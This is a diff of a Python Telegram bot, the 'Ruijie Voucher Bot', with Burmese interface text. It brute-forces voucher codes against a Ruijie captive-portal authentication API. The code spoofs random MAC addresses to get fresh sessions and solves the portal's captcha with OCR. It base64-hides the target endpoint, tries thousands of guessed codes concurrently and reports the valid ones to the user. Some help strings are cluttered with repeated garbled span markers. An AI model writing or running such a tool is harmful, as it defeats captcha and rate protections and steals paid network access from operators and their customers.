@@ -1,12 +1,12 @@
 import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
 from telebot.async_telebot import AsyncTeleBot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
 import cv2
 import ddddocr
 import numpy as np
 from datetime import datetime, timezone
 
-# Render Environment Variable မှ BOT_TOKEN ကို ဆွဲဖတ်မည်
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 REPO_OWNER = os.environ.get("REPO_OWNER", "")
@@ -63,36 +63,6 @@ async def rebuild_session():
         connector_owner=False
     )
 
-async def get_file_content(path):
-    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
-        return {}, None
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    async with session.get(url, headers=headers) as response:
-        if response.status == 200:
-            data = await response.json()
-            content = base64.b64decode(data['content']).decode('utf-8')
-            return json.loads(content), data['sha']
-    return {}, None
-
-async def update_file_content(path, content, sha, message):
-    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
-        return ""
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Content-Type": "application/json"
-    }
-    encoded = base64.b64encode(json.dumps(content).encode()).decode()
-    payload = {
-        "message": message,
-        "content": encoded,
-    }
-    if sha:
-        payload["sha"] = sha
-    async with session.put(url, headers=headers, json=payload) as response:
-        return await response.text()
-
 TELEGRAM_MESSAGE_LIMIT = 3900
 TELEGRAM_RETRY_LIMIT = 3
 
@@ -143,46 +113,65 @@ async def safe_edit_message_text(chat_id, message_id, text, **kwargs):
                 raise
             await asyncio.sleep(1 + attempt)
 
-async def update_chunked_messages(chat_id, title, items, message_ids=None):
-    chunks = split_telegram_message(f"{title}\n\n" + "\n\n".join(items))
-    message_ids = list(message_ids or [])
-    for index, chunk in enumerate(chunks):
-        if index < len(message_ids):
-            try:
-                await safe_edit_message_text(chat_id, message_ids[index], chunk)
-                continue
-            except Exception:
-                pass
-        sent = await safe_send_message(chat_id, chunk)
-        if index < len(message_ids):
-            message_ids[index] = sent.message_id
-        else:
-            message_ids.append(sent.message_id)
-    return message_ids
-
 bot.send_message = safe_send_message
 bot.reply_to = safe_reply_to
 bot.edit_message_text = safe_edit_message_text
 
 @bot.message_handler(commands=['start'])
 async def start(message):
-    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /input ဖြင့် Session URL ထည့်သွင်းပြီး /scan ဖြင့်စတင်ပါ။")
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("🚀 စကန်ဖတ်ရန် (Scan)", callback_data="btn_scan_help"),
+        InlineKeyboardButton("📌 အကူအညီ (Help)", callback_data="btn_help")
+    )
+    markup.add(
+        InlineKeyboardButton("⚙️ အခြေအနေ (Status)", callback_data="btn_status"),
+        InlineKeyboardButton("🛑 ရပ်ရန် (Stop)", callback_data="btn_stop")
+    )
+    await bot.reply_to(
+        message,
+        "✨ **Ruijie Voucher Bot** မှ ကြိုဆိုပါတယ် ဗျာ! ⚡\n\n"
+        "အောက်ပါခလုတ်များကို အသုံးပြု၍ စီမံနိုင်ပါသည် 👇",
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
+
+@bot.callback_query_handler(func=lambda call: True)
+async def callback_query(call):
+    chat_id = call.message.chat.id
+    data = call.data
+    if data == "btn_scan_help":
+        await bot.answer_callback_query(call.id, "💡 ညွှန်ကြားချက်: /input <url> ဖြင့် အရင်ချိတ်ပါ")
+        await bot.send_message(chat_id, "📌 <u>အသုံးပြုပုံ</u>:\n၁။ `/input your_url` ဖြင့် Session URL ထည့်ပါ[span_28](start_span)[span_28](end_span)[span_29](start_span)[span_29](end_span)[span_30](start_span)[span_30](end_span)[span_31](start_span)[span_31](end_span)[span_32](start_span)[span_32](end_span)[span_33](start_span)[span_33](end_span)[span_34](start_span)[span_34](end_span)[span_35](start_span)[span_35](end_span)[span_36](start_span)[span_36](end_span)[span_37](start_span)[span_37](end_span)[span_38](start_span)[span_38](end_span)[span_39](start_span)[span_39](end_span)[span_40](start_span)[span_40](end_span)[span_41](start_span)[span_41](end_span)\n၂။ `/scan 6` (သို့) `/scan all` ဖြင့် စတင်ပါ[span_42](start_span)[span_42](end_span)[span_43](start_span)[span_43](end_span)[span_44](start_span)[span_44](end_span)[span_45](start_span)[span_45](end_span)[span_46](start_span)[span_46](end_span)[span_47](start_span)[span_47](end_span)[span_48](start_span)[span_48](end_span)[span_49](start_span)[span_49](end_span)[span_50](start_span)[span_50](end_span)[span_51](start_span)[span_51](end_span)[span_52](start_span)[span_52](end_span)[span_53](start_span)[span_53](end_span)[span_54](start_span)[span_54](end_span)[span_55](start_span)[span_55](end_span)", parse_mode="HTML")
+    elif data == "btn_help":
+        await bot.answer_callback_query(call.id, "ℹ️ အကူအညီ မီနူး")
+        await bot.send_message(chat_id, "📖 Commands:\n/input - URL ထည့်ရန်\n/scan - ကုဒ်စကန်ရန်\n/stop - ရပ်တန့်ရန်")
+    elif data == "btn_status":
+        active = "အလုပ်လုပ်နေသည် 🟢" if chat_id in scan_tasks else "ရပ်နားထားသည် 🔴"
+        await bot.answer_callback_query(call.id, f"📊 အခြေအနေ: {active}")
+        await bot.send_message(chat_id, f"📊 လက်ရှိ Bot အခြေအနေ:\n• Status: {active}\n• Active Scans: {len(scan_tasks)}")
+    elif data == "btn_stop":
+        await bot.answer_callback_query(call.id, "🛑 စကန်ဖတ်မှုကို ရပ်လိုက်ပါပြီ")
+        data_task = scan_tasks.get(chat_id)
+        if data_task and not data_task["task"].done():
+            data_task["stop"] = True
+            data_task["task"].cancel()
+            scan_tasks.pop(chat_id, None)
+            await bot.send_message(chat_id, "✅ စကန်ဖတ်ခြင်း အောင်မြင်စွာ ရပ်သွားပါပြီ။")
+        else:
+            await bot.send_message(chat_id, "⚠️ လက်လွှတ်စရာ စကန်ဖတ်မှု မရှိပါ။")
 
 async def check_session_url(session_url):
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.9',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36'
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     }
     try:
         async with session.get(session_url, allow_redirects=True, headers=headers) as response:
             final_url = str(response.url)
             body = await response.text()
-            if "sessionId" in final_url or "sessionId" in body or response.status in (200, 302, 301):
-                return True
-            return False
-    except Exception as e:
-        print(f"[check_session_url] error: {e}")
+            return "sessionId" in final_url or "sessionId" in body or response.status in (200, 302, 301)
+    except Exception:
         return False
 
 @bot.message_handler(commands=['input'])
@@ -190,60 +179,46 @@ async def handle_input(message):
     chat_id = message.chat.id
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
+        await bot.reply_to(message, "⚠️ <b>Usage:</b> `/input your_session_url`", parse_mode="HTML")
         return
     url = args[1]
     user_data.setdefault(chat_id, {})
-    await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
+    await bot.reply_to(message, "🔄 Session URL အား စစ်ဆေးနေပါပြီ ⏳...")
     if await check_session_url(session_url=url):
         user_data[chat_id]['session_url'] = url
-        await bot.reply_to(message, "Session URL သိမ်းပြီးပါပြီ။ /scan ကိုအသုံးပြုနိုင်ပါသည်။")
+        await bot.reply_to(message, "✅ Session URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ 🎉! /scan ဖြင့် စတင်နိုင်ပါပြီ။")
     else:
-        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")
+        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းကုန်သွားပါပြီ။")
 
 @bot.message_handler(commands=['scan'])
 async def scan(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>")
+        await bot.reply_to(message, "⚠️ <b>Usage:</b> `/scan <6, 7, 8, ascii-lower, all>`", parse_mode="HTML")
         return
     mode = args[1]
     chat_id = message.chat.id
     if mode not in {"6", "7", "8", "all", "ascii-lower"}:
-        await bot.reply_to(message, "Mode သည် 6, 7, 8, all, ascii-lower ထဲမှ တစ်ခုဖြစ်ရပါမည်။")
+        await bot.reply_to(message, "❌ Mode သည် 6, 7, 8, all, ascii-lower ထဲမှ တစ်ခုဖြစ်ရပါမည်။")
         return
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
-        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
+        await bot.reply_to(message, "⚠️ ပထမဦးစွာ `/input` ဖြင့် Session URL ထည့်သွင်းပေးပါရန်။")
         return
 
     if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
-        await bot.reply_to(message, "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။")
+        await bot.reply_to(message, "⚠️ စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ်သည် လက်ရှိတွင် အလုပ်လုပ်နေဆဲ ဖြစ်ပါသည်။")
         return
 
-    progress_msg = await safe_send_message(chat_id, "🔍Scanning Codes...\n\n")
+    progress_msg = await safe_send_message(chat_id, "🔍 စကန်ဖတ်ခြင်း စတင်နေပါပြီ ⚡...")
     scan_id = str(uuid.uuid4())
     task = asyncio.create_task(
-        run_bruteforce(
-            mode,
-            chat_id,
-            user_data[chat_id]['session_url'],
-            scan_id,
-            message=message,
-            progress_msg=progress_msg
-        )
+        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
     )
 
     scan_tasks[chat_id] = {
-        "task": task,
-        "stop": False,
-        "scan_id": scan_id,
-        "checked": 0,
-        "total": None,
-        "speed": 0,
-        "found": 0,
-        "retries": 0,
-        "start_time": time.monotonic(),
-        "mode": None,
+        "task": task, "stop": False, "scan_id": scan_id,
+        "checked": 0, "total": None, "speed": 0, "found": 0,
+        "retries": 0, "start_time": time.monotonic(), "mode": mode
     }
 
 @bot.message_handler(commands=['stop'])
@@ -252,30 +227,20 @@ async def stop_scan(message):
     data = scan_tasks.get(chat_id)
     if data and not data["task"].done():
         data["stop"] = True
-        data["scan_id"] = None
-        for child_task in data.get("pending", set()):
-            child_task.cancel()
         data["task"].cancel()
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-        retry_counts.pop(chat_id, None)
-        _session_pool.pop(chat_id, None)
-        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
+        scan_tasks.pop(chat_id, None)
+        await bot.reply_to(message, "🛑 စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ်ကို ရပ်တန့်လိုက်ပါပြီ။")
     else:
-        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")
+        await bot.reply_to(message, "⚠️ လက်ရှိ လုပ်ဆောင်နေသော စကန်ဖတ်မှု မရှိပါ။")
 
 def digit_generator(length):
     return "".join(random.choice(string.digits) for _ in range(length))
 
-strings = string.ascii_lowercase + string.digits
 def all_generator(length=6):
-    return "".join(random.choice(strings) for _ in range(length))
+    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
 
-strings_2 = string.ascii_lowercase
 def ascii_generator(length=6):
-    return "".join(random.choice(strings_2) for _ in range(length))
+    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))
 
 def iter_codes(mode):
     if mode in ["6", "7"]:
@@ -297,60 +262,33 @@ def iter_codes(mode):
     if mode == "all":
         while True:
             yield all_generator(6)
-    raise ValueError(f"Unsupported scan mode: {mode}")
+    raise ValueError("Unsupported mode")
 
 def format_progress(checked, total=None, speed=0, found=0, retries=0):
     speed_str = f"{speed:,.0f} codes/min"
     if total is not None:
-        bar_length = 20
         percent = (checked / total) * 100
-        filled = min(bar_length, int(percent / 5))
-        bar = "█" * filled + "░" * (bar_length - filled)
-        return (
-            f"🔍Scanning Codes...\n\n"
-            f"📦Checked : {checked:,}/{total:,}\n"
-            f"📊Progress : {percent:.2f}%\n"
-            f"⚡Speed : {speed_str}\n"
-            f"✅Found : {found}\n"
-            f"🔁Retry : {retries}\n"
-            f"[{bar}]"
-        )
-    return (
-        f"🔍Scanning Codes...\n\n"
-        f"📦Checked : {checked:,}\n"
-        f"⚡Speed : {speed_str}\n"
-        f"✅Found : {found}\n"
-        f"🔁Retry : {retries}\n"
-        f"📊Status : running\n"
-    )
+        filled = min(20, int(percent / 5))
+        bar = "█" * filled + "░" * (20 - filled)
+        return f"🔍 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}/{total:,}\n📊 Progress: {percent:.2f}%\n⚡ Speed: {speed_str}\n✅ Found: {found}\n🔁 Retries: {retries}\n[{bar}]"
+    return f"🔍 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}\n⚡ Speed: {speed_str}\n✅ Found: {found}\n🔁 Retries: {retries}\n📊 Status: Running 🟢"
 
 async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
     try:
         code_iter = iter_codes(mode)
-    except ValueError as e:
-        await safe_send_message(chat_id, str(e))
+    except Exception:
         return
     total = 10 ** int(mode) if mode in ["6", "7"] else None
     checked = 0
     scan_start = time.monotonic()
-    if chat_id in scan_tasks:
-        scan_tasks[chat_id]["total"] = total
-        scan_tasks[chat_id]["mode"] = mode
-        scan_tasks[chat_id]["start_time"] = scan_start
     global _voucher_sem
-    effective_concurrency = CONCURRENCY
-    _voucher_sem = asyncio.Semaphore(effective_concurrency)
-
-    pending: set = set()
-    if chat_id in scan_tasks:
-        scan_tasks[chat_id]["pending"] = pending
+    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
+    pending = set()
     last_update = time.monotonic()
 
     async def _check(code):
         async with _voucher_sem:
-            return await perform_check(
-                session_url, code, chat_id, scan_id, message=message
-            )
+            return await perform_check(session_url, code, chat_id, scan_id, message=message)
 
     async def _flush_progress():
         nonlocal last_update
@@ -362,322 +300,90 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         speed = (checked / elapsed * 60) if elapsed > 0 else 0
         found = len(success_texts.get(chat_id, []))
         retries = retry_counts.get(chat_id, 0)
-        if chat_id in scan_tasks:
-            scan_tasks[chat_id]["checked"] = checked
-            scan_tasks[chat_id]["speed"] = speed
-            scan_tasks[chat_id]["found"] = found
-            scan_tasks[chat_id]["retries"] = retries
         text = format_progress(checked, total, speed, found, retries)
         try:
-            await safe_edit_message_text(
-                chat_id=chat_id,
-                message_id=progress_msg.message_id,
-                text=text
-            )
+            await safe_edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML")
         except Exception:
-            try:
-                new_msg = await safe_send_message(chat_id, text)
-                progress_msg.message_id = new_msg.message_id
-            except Exception as err:
-                print(f"Progress Message Error: {err}")
+            pass
 
     try:
         for code in code_iter:
             current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id:
+            if not current_task or current_task.get("stop"):
                 break
-            if current_task.get("stop"):
-                scan_tasks.pop(chat_id, None)
-                success_messages.pop(chat_id, None)
-                success_texts.pop(chat_id, None)
-                break
-
             t = asyncio.create_task(_check(code))
             pending.add(t)
             t.add_done_callback(pending.discard)
-
-            if len(pending) >= effective_concurrency:
+            if len(pending) >= CONCURRENCY:
                 done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                 checked += len(done)
                 await _flush_progress()
-
         while pending:
             done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
             checked += len(done)
-
-        if progress_msg:
-            final_found = len(success_texts.get(chat_id, []))
-            final_retries = retry_counts.get(chat_id, 0)
-            finish_text = (
-                "🔍Scanning Completed\n\n"
-                f"📦Checked : {checked:,}\n"
-                f"✅Found : {final_found}\n"
-                f"🔁Retry : {final_retries}\n"
-                "📊Progress : 100%\n"
-                "[████████████████████]"
-            )
-            try:
-                await safe_edit_message_text(
-                    chat_id=chat_id,
-                    message_id=progress_msg.message_id,
-                    text=finish_text
-                )
-            except Exception:
-                pass
-        scan_tasks.pop(chat_id, None)
     finally:
-        for child_task in pending:
-            if not child_task.done():
-                child_task.cancel()
-        if pending:
-            await asyncio.gather(*pending, return_exceptions=True)
+        for t in pending:
+            t.cancel()
         scan_tasks.pop(chat_id, None)
-
-def get_mac():
-    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
-    return ':'.join(f'{x:02x}' for x in mac)
 
 async def get_session_id(session, session_url, previous_session_id=None):
-    mac = get_mac()
+    mac = ':'.join(f'{random.choice([0x02, 0x06, 0x0A, 0x0E]):02x}' for _ in range(1)) + ''.join(f':{random.randint(0,255):02x}' for _ in range(5))
     session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36'
-    }
     try:
-        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
-            response = str(req.url)
-            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
-            if session_id:
-                return session_id.group(1)
-            return previous_session_id
+        async with session.get(session_url, allow_redirects=True) as req:
+            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
+            return match.group(1) if match else previous_session_id
     except Exception:
         return previous_session_id
 
-async def get_pooled_session_id(chat_id, task_session, session_url):
-    if chat_id not in _session_pool:
-        _session_pool[chat_id] = {
-            "slots": [{"session_id": None, "uses": 0, "lock": asyncio.Lock()} for _ in range(SESSION_POOL_SLOTS)],
-            "rr": 0
-        }
-    pool = _session_pool[chat_id]
-    for i in range(SESSION_POOL_SLOTS):
-        idx = (pool["rr"] + i) % SESSION_POOL_SLOTS
-        entry = pool["slots"][idx]
-        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
-            pool["rr"] = (idx + 1) % SESSION_POOL_SLOTS
-            entry["uses"] += 1
-            return entry["session_id"]
-
-    idx = pool["rr"] % SESSION_POOL_SLOTS
-    pool["rr"] = (pool["rr"] + 1) % SESSION_POOL_SLOTS
-    entry = pool["slots"][idx]
-    async with entry["lock"]:
-        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
-            entry["uses"] += 1
-            return entry["session_id"]
-        new_sid = await get_session_id(task_session, session_url, entry["session_id"])
-        if new_sid:
-            entry["session_id"] = new_sid
-            entry["uses"] = 1
-        return entry["session_id"]
-
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    if not recheck:
-        current_task = scan_tasks.get(chat_id)
-        if not current_task or current_task.get("scan_id") != scan_id:
-            return
-
-    post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
-    ).decode()
-
+async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
+    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
     response = None
     for _attempt in range(3):
-        timeout = aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as task_session:
-
-            session_id = await get_pooled_session_id(chat_id, task_session, session_url)
+        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30)) as task_session:
+            session_id = await get_session_id(task_session, session_url)
             if not session_id:
                 return
-
-            auth_code = None
-            for _ in range(3):
-                try:
-                    image = await Captcha_Image(task_session, session_id)
-                    text = await Captcha_Text(image)
-                    if not text:
-                        continue
-                    verified = await Varify_Captcha(task_session, session_id, text)
-                    if verified:
-                        auth_code = text
-                        break
-                except Exception:
-                    pass
-            if not auth_code:
-                return
-
-            if not recheck:
-                current_task = scan_tasks.get(chat_id)
-                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                    return
-
-            data = {
-                "accessCode": code,
-                "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": auth_code,
-            }
-            headers = {
-                "authority": "portal-as.ruijienetworks.com",
-                "accept": "*/*",
-                "content-type": "application/json",
-                "origin": "https://portal-as.ruijienetworks.com",
-                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
-            }
             try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
+                img = await task_session.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={session_id}&_t={time.time()}')
+                img_bytes = await img.read()
+                ocr_text = _ocr.classification(img_bytes).upper()
+                verify = await task_session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': session_id, 'authCode': ocr_text})
+                v_data = await verify.json()
+                if not v_data.get("success"):
+                    continue
+                async with task_session.post(post_url, json={"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": ocr_text}) as req:
                     response = await req.text()
                     if req.status in (401, 403):
                         return
-                    if req.status == 429:
-                        response = "request limited"
             except Exception:
                 return
-
-        if response and 'captcha' in response:
-            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
-            continue
         break
-
-    if not response:
-        return
-
-    if 'logonUrl' in response:
+    if response and 'logonUrl' in response:
         if chat_id not in success_texts:
             success_texts[chat_id] = []
-        expire_date = await Code_Expires_Date(session_id)
-        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
+        success_texts[chat_id].append(f"🎫 <code>{code}</code>")
         if message:
             try:
-                success_messages[chat_id] = await update_chunked_messages(
-                    message.chat.id,
-                    "Success Codes:",
-                    success_texts[chat_id],
-                    success_messages.get(chat_id)
-                )
+                await safe_send_message(message.chat.id, f"🎉 **Success Code Found!**\n\n🎫 Code: <code>{code}</code>", parse_mode="HTML")
             except Exception:
                 pass
-    elif 'STA' in response:
-        if chat_id not in limited_texts:
-            limited_texts[chat_id] = []
-        expire_date = await Code_Expires_Date(session_id)
-        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
-        if message:
-            try:
-                limited_messages[chat_id] = await update_chunked_messages(
-                    message.chat.id,
-                    "Limited Codes:",
-                    limited_texts[chat_id],
-                    limited_messages.get(chat_id)
-                )
-            except Exception:
-                pass
-
-def Minute_to_Hour(total_minutes):
-    if total_minutes == 'Unknown':
-        return 'Unknown'
-    hours = int(total_minutes) // 60
-    minutes = int(total_minutes) % 60
-    if hours > 0 and minutes > 0:
-        return f"{hours}h {minutes}m"
-    elif hours > 0:
-        return f"{hours}h"
-    else:
-        return f"{minutes}m"
-
-async def Code_Expires_Date(session_id):
-    headers = {
-        'authority': 'portal-as.ruijienetworks.com',
-        'accept': 'application/json',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=15)
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), timeout=timeout) as fresh_session:
-            async with fresh_session.get(f"http://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}", headers=headers) as req:
-                respond = await req.json()
-                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
-                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
-                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
-    except Exception:
-        return "📋 Plan: Unknown | ⏳ Time: Unknown"
 
 _ocr = ddddocr.DdddOcr(show_ad=False)
-_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=300)
-
-def _ocr_sync(image_bytes):
-    nparr = np.frombuffer(image_bytes, np.uint8)
-    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-    if img is None:
-        return None
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    blur = cv2.GaussianBlur(gray, (3, 3), 0)
-    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    _, buffer = cv2.imencode('.png', thresh)
-    result = _ocr.classification(buffer.tobytes())
-    return result.upper()
-
-async def Captcha_Text(image_bytes):
-    loop = asyncio.get_event_loop()
-    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)
-
-async def Captcha_Image(session, session_id):
-    params = {'sessionId': session_id, '_t': str(time.time())}
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
-        if req.status != 200:
-            raise RuntimeError("captcha failed")
-        return await req.read()
-
-async def Varify_Captcha(session, session_id, text):
-    json_data = {'sessionId': session_id, 'authCode': text}
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as req:
-        body = await req.text()
-        if req.status != 200:
-            return None
-        try:
-            data = json.loads(body)
-        except Exception:
-            return None
-        return session_id if data.get("success") is True else None
 
 async def start_polling():
     while True:
         try:
             await bot.infinity_polling(timeout=20, request_timeout=35)
         except Exception as e:
-            print(f"[polling error]: {e}")
             await asyncio.sleep(5)
 
 async def main():
-    await rebuild_session()
-    try:
-        await asyncio.gather(
-            web_server(),
-            start_polling()
-        )
-    finally:
-        if session and not session.closed:
-            await session.close()
-        if _connector and not _connector.closed:
-            await _connector.close()
+    global _connector
+    _connector = aiohttp.TCPConnector(limit=6000, ssl=False)
+    global session
+    session = aiohttp.ClientSession(connector=_connector, connector_owner=False)
+    await asyncio.gather(web_server(), start_polling())
 
 if __name__ == '__main__':
     asyncio.run(main())
